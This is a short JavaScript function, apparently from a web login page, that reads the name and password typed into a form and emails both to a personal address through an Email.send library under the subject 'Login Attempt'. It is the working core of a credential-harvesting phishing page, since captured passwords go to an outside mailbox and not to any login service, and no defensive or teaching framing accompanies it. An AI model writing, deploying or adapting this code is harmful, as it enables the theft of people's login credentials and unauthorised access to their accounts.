function emailSend() {
    var userName = document.getElementById('name').value;
    var password = document.getElementById('password').value;

    var messageBody = "Name: " + userName + "<br/> Password: " + password;
    
    Email.send({
        SecureToken: "XXXXXXXXXXXXXXXXXXXXX",
        To: 'Personal Email id ',
        From: "Personal Email id ",
        Subject: "Login Attempt",
        Body: messageBody
    }).then(
      
    );
}
